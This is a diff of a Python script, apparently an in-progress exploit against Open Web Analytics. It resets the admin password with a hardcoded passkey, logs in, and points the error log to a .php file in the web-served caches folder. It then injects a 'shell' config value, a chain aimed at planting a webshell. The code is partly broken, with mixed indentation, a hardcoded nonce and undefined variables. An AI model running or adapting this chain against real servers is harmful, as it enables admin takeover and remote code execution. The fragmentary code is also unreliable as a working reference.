@@ -23,31 +23,63 @@ for key in range(100):
   	sd = vx.replace('*' , '  *')
   	yum = sd.replace('*' ,'')
   	varane = yum.split()
-  	messi = open('booba.txt' , 'r')
-  	var = str(messi.read())
+  	#hash
   	
-  	re = var.replace("temp_passkey" , "         \n\ntemp_passkey")
-  	cv = re.replace('data_type' , '   \n\ndata_type')
-  	cvv = str(cv)
-  	cx = open('doc.txt' , 'r')
-  	for xxx in cx :
-  		if 'temp' in xxx:
-  			doc = xxx.replace(':', '  :')
-  			vh = doc.split()
-  			nc = (vh[10].replace(':', ''))
-  			ncc = (nc.replace('"', ''))
-  			pas = (ncc.replace(';s', ''))
-  			
-  			data = {
-  			"owa_password": 'jon' ,
-  			"owa_password2": 'jon',
-  			"owa_k": pas,
-  			"owa_action": 
-  			"base.usersChangePassword"
-  			}
-  			
-  			password = base_url + "index.php?owa_do=base.usersPasswordEntry"
-  			req = requests.post(password, data=data)
-  			print(req.url)
+  	
+  	login = base_url + "index.php?owa_do=base.loginForm"
+  	
+  	password= base_url + "index.php?owa_do=base.usersPasswordEntry"
+  	
+  	config= base_url + "index.php?owa_do=base.optionsGeneral"
+  	
+  	data2 = {
+      "owa_user_id": 'admin',
+      "owa_password": 'jon',
+      "owa_action": "base.login"
+   }
+  	
+  	
+  	data1 = {
+      "owa_password": 'jon',
+      "owa_password2": 'jon',
+      "owa_k": 'e2b0d13782e45fbe8c2fd028e661fc37',
+      "owa_action": 
+      "base.usersChangePassword"
+   }
    
-     	
+  	
+  	 
+  	
+  	
+   
+
+  	req1 = requests.post(password, data=data1)
+  	session= requests.Session()
+  	req2 = session.post(login, data=data2)
+  	cookie = session.cookies.get_dict()
+  	
+  	log_location = "/var/www/html/owa/owa-data/caches/" + 'jo.php'
+   data3 = {
+      "owa_nonce": 'ebf17b9629', 
+      "owa_action": "base.optionsUpdate", 
+      "owa_config[base.error_log_file]": log_location, 
+      "owa_config[base.error_log_level]": 2
+   }
+   sam = requests.post(config, data=data3, cookies=cookie)
+   
+   reverse = 'jon'
+   
+   
+     data = {
+      "owa_nonce": 'ebf17b9629',
+      "owa_action": "base.optionsUpdate", 
+      "owa_config[shell]": reverse
+   }
+   
+   
+   sad = req
+   
+  
+  	
+  	
+  	
